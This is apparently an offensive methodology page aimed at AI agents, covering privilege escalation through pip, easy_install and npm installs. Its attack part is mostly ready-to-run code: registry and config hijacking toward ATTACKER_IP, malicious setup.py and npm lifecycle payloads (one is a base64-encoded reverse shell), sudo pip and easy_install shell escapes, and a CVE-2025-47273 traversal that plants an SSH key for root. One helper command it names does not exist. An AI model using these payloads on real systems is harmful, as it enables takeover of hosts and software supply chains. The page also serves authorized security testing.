---
technology: "Python pip / npm package managers"
kind: bug-bounty-methodology
audience: ai-agent
version: 1.0
family: build-and-package
evidence: "7 writeups (see ../internal coverage ledger)"
provenance: "corpus-mined from 7 strict-gated writeups in the writeup corpus + upstream-verified: pypa/setuptools GHSA-5rjg-fvgr-3xxf / CVE-2025-47273 (affected <78.1.1, fixed 78.1.1, commit 250a6d1, package_index deprecated), GTFOBins pip + easy_install entries (setup.py code execution incl. sudo context; pip config --editor shell), npm docs behavior for .npmrc hierarchy and npm_config_* environment (npmrc files: project, user, global; environment overrides). Accessed 2026-11-12"
---

Companion page: [[package-managers|pip/npm package managers overview]] — the attack surface model (registry trust + root execution). Tool reference notes live in the separate tools vault; Appendix A names the relevant tools in prose.

# pip / npm Package-Manager Bug Bounty Methodology

**Scope:** privilege escalation and code execution through Python (pip, easy_install, setuptools) and Node (npm) install flows — privileged install triggers, registry/index configuration hijacking, malicious package publishing to private mirrors, install-time build-code execution, and resolver file-write bugs. **Out of scope:** the web surfaces of the applications those packages belong to ([[node-express]], [[flask]] and friends own those), dependency-confusion in CI pipelines you cannot reach from the foothold, and the registry software's own web UI bugs (unless publishing through them).

**Authorization:** presume written permission. Publishing packages to an org's internal registry and executing code through root installers are high-impact, logged actions — stage payloads non-destructively, prefer proof-of-execution (`id` output, marker files) over shells when the engagement allows, and clean up published packages afterward.

## Decision tree (one screen)

1. `sudo -l` grants pip/easy_install/npm → Phase 4 (privileged install abuse) — fastest path.
2. Root cron/boot/deploy script runs an installer → Phase 1 (trigger) → Phase 2 (where does it install from?) → Phase 3 (can you publish there?).
3. User-writable `.npmrc`/`pip.conf`/env influencing a privileged install → Phase 2 (config hijack).
4. Root-run script passes URLs to setuptools/easy_install plugin installation → Phase 5 (CVE-2025-47273 traversal).
5. Service process leaks `npm_config_*`/`npm_lifecycle_script` → Phase 1 loot only (startup command, debugger flags) — the actual debugger hunt belongs to [[node-express]].

## Phase 1 — Privileged-trigger discovery

```bash
sudo -l                                   # look for pip3, pip, easy_install, npm
grep -REn "(pip3?|easy_install|npm|yarn|twine) (install|download|i |update)" \
     /etc/cron* /var/spool/cron/ /etc/systemd/ /opt/ /usr/local/bin/ 2>/dev/null
# environment of any service started through npm (registry config + startup command)
cat /proc/$(pgrep -f 'node|npm' | head -1)/environ | tr '\0' '\n' | grep -E "npm_|NODE_|HOME="
find / -name ".npmrc" -o -name "pip.conf" -o -name "pip" -type d 2>/dev/null | grep -v node_modules
```

Record for each trigger: the invoking identity, the exact command line, the fixed arguments (package names, URLs), and which config files the invocation reads (pip cascade: flag > `PIP_INDEX_URL` > user `~/.pip/pip.conf`/`~/.config/pip/pip.conf` > `/etc/pip.conf`; npm: project `.npmrc` > user `$HOME/.npmrc` > `/etc/npmrc`, all overridable by `npm_config_*` in the environment).

The npm environment leak is itself loot: a service started via `npm run` exports `npm_lifecycle_script` (the full startup command, `--inspect` debugger flags included), `npm_config_registry`, and `npm_config_userconfig` into the process environment — read them from `/proc/<pid>/environ` with any environment-disclosure bug.

## Phase 2 — Registry and config hijack surfaces

- **Where does the privileged install actually fetch from?** Extract the effective index: run the trigger's exact command as the low-priv user with `-v` where possible, or read the config cascade by hand. Private mirrors to look for: pypiserver/devpi (PyPI-style `/simple/` indexes), Verdaccio (`:4873` default).
- **Who can publish to that mirror?** Anonymous publish, shared credentials in the trigger script, or an account you already hold = Phase 3. Check `npm whoami`/`npm adduser` against the instance, or the pypiserver upload password in the deploy script.
- **Writable config, privileged reader.** If the low-priv user writes `~/.npmrc` and root's npm resolves HOME (or `npm_config_userconfig`) to that path, a two-line npmrc wins: set `registry=http://ATTACKER_IP:4873/` and the root install fetches your package and runs its lifecycle scripts as root. The same logic applies to a writable `pip.conf` `index-url` pointing at a server you run (`python -m http.directory` style pypiserver or a hand-rolled `/simple/` tree).
- **HOME laundering.** For root-run npm, what HOME does it see? Scripts that preserve or reconstruct HOME (`HOME=/home/user` in a wrapper, `sudo -E`, environment passthrough in systemd `User=` units) are the bridge between a user-writable npmrc and a root reader.

## Phase 3 — Malicious package construction

```bash
# Python sdist: the payload is setup.py; a package is three files
mkdir pkgname && cd pkgname
touch pkgname/__init__.py README.md
cat > setup.py <<'EOF'
import setuptools, os
os.system("id > /tmp/pkg-pwned")          # proof-of-execution; reverse shell variant:
# os.system("echo L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC80NDQ0IDA+JjEK | base64 -d | bash")
setuptools.setup(name="pkgname", version="0.0.1", packages=["pkgname"])
EOF
python3 setup.py sdist                     # or: python -m build
twine upload --repository-url http://pypi.example.com/ dist/*   # to a reachable private index

# npm: the payload is a lifecycle script
npm init -y
node -e "const p=require('./package.json'); p.scripts={preinstall:'id > /tmp/npm-pwned'}; require('fs').writeFileSync('package.json', JSON.stringify(p,null,2))"
npm publish --registry http://198.51.100.10:4873/                # Verdaccio-style private registry
```

Name selection matters more than payload: match a package the trigger already installs (shadow it on the mirror — the mirror answers first), or register the name the org's tooling will request next. If you control the mirror entirely (Phase 2), any requested name resolves to your artifact.

## Phase 4 — Privileged install abuse (the GTFOBins classes)

Applies when sudo grants the installer binary directly. The installers do not drop elevated privileges before running build code.

```bash
# sudo pip / pip3 (also works for 'pip download' of a local dir where allowed)
TF=$(mktemp -d)
echo 'import os; os.execl("/bin/sh","sh","-p","-c","id > /tmp/pwned; exec /bin/sh -p </dev/tty >/dev/tty 2>&1")' > $TF/setup.py
sudo pip3 install $TF                      # or: sudo pip3 download $TF  (build code still runs)

# sudo easy_install (legacy hosts)
sudo easy_install $TF

# sudo npm — combine with Phase 2/3: root npm reads attacker-influenced config,
# fetches the attacker package, runs preinstall/postinstall as root
sudo npm install -g                        # whatever flags the sudo rule allows

# pip config editor escape (no package needed)
sudo pip config --editor '/bin/sh -c "id > /tmp/pwned"' edit
```

`easy_install` deserves explicit enumeration on any older host even when pip is also granted: it is a separate binary, separately granted, and separately forgotten. Expect `--break-system-packages` friction on newer pip/PEP 668 hosts — the flag (or `--target` into a writable dir) keeps the execution path alive.

## Phase 5 — Resolver file-write traversal (CVE-2025-47273)

Preconditions, verified upstream: setuptools < 78.1.1 (fixed in 78.1.1; `package_index` deprecated and later removed), and a privileged context that feeds attacker-influenced URLs into `PackageIndex`/`easy_install` fetching — the recurring real-world shape is a root-run "plugin installer" script that takes a plugin URL.

Mechanics: the download filename is derived from the URL's last path segment with weak `..`-scrubbing; a percent-encoded absolute path (`http://ATTACKER_IP:8000/%2Froot%2F.ssh%2Fauthorized_keys`) makes `os.path.join(tmpdir, name)` discard `tmpdir` and write the fetched content to the absolute path with the invoking (root) process's permissions.

```bash
# attacker side: serve the payload at a traversal-crafted path
echo "ssh-ed25519 AAAA... user@kali" > authorized_keys
python3 -m http.server 8000                # content at /%2Froot%2F.ssh%2Fauthorized_keys
# trigger the root-run plugin/easy_install flow against:
#   http://ATTACKER_IP:8000/%2Froot%2F.ssh%2Fauthorized_keys
```

Confirm the setuptools version first (`pip3 show setuptools` / `python3 -c "import setuptools; print(setuptools.__version__)"`); on 78.1.1+ the module sanitizes absolute names and later releases remove `package_index` entirely.

## Phase 6 — Verification, loot, cleanup

- Prove the execution context before anything else: marker file with `id` output, or a callback to ATTACKER_IP with the uid in the User-Agent.
- Escalate minimally: SSH key into `/root/.ssh/authorized_keys` (traversal route) or a shell via the GTFOBins route; avoid modifying system packages beyond your published artifact.
- Cleanup checklist: delete published packages from the private registry, restore any modified `.npmrc`/`pip.conf`, remove marker files, note the exact chain in the report (trigger → config → artifact → execution identity).

## Appendix A — Tool map (tools vault owns per-tool detail)

- **pip / pip3, easy_install, setuptools** — the Python-side installers and build backend; config cascade and build-time execution are the surface. GTFOBins documents the sudo classes.
- **npm CLI** — `.npmrc` hierarchy, `npm_config_*` environment, lifecycle scripts, `npm publish --registry`.
- **twine** — sdist/wheel upload to a PyPI-style index (pypiserver, devpi).
- **pypiserver / devpi** — private Python indexes; check anonymous upload policy.
- **Verdaccio** — private npm registry, default port 4873; lightweight local instance (`docker pull verdaccio/verdaccio`) for staging malicious packages during testing.
- **GTFOBins** — reference for pip/easy_install sudo and shell classes; verify entries against the live binary's flags before relying on them.
